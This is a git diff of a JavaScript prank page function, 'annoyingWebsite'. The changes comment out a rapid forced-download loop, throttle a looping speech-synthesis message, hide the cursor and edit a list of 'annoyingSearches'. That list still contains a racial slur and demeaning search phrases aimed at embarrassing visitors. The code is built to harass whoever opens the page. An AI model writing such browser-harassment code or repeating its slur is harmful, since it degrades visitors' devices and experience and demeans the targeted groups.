@@ -28,17 +28,18 @@ function annoyingWebsite() {
     a.click();
   }
 
-  setInterval(annoyingFileDownload, 1);
+  // setInterval(annoyingFileDownload, 1);
   function cursorGone() {
     document.querySelector("html").style = "cursor: none;";
   }
+
   function annoyingSpeech() {
     window.speechSynthesis.onvoiceschanged = function () {
       var voices = window.speechSynthesis.getVoices();
-      for (let i = 0; i <= 8; i++) {
-        var random = Math.floor(Math.random() * 8);
+      for (let i = 0; i <= 7; i++) {
+        var random = Math.floor(Math.random() * 7);
         var voiceArray = [0, 1, 2, 3, 4, 6, 7, 8, 9];
-        console.log(i, voices[voiceArray[random]]);
+        console.log(random, voices[voiceArray[random]]);
         var speechArray = ["you are in a dream. wake up!"];
         function speak() {
           var msg = new SpeechSynthesisUtterance();
@@ -56,8 +57,7 @@ function annoyingWebsite() {
       }
     };
   }
-
-  setInterval(annoyingSpeech, 1);
+  setInterval(annoyingSpeech, 100);
   cursorGone();
 
   var words = [
@@ -118,8 +118,6 @@ function annoyingWebsite() {
       var annoyingSearches = [
         " nigga hoe",
         "gay kissing",
-        "meme",
-        "american karin",
         "why I am a loser",
         "why everyone hates me",
         "why I am an Anime Character",
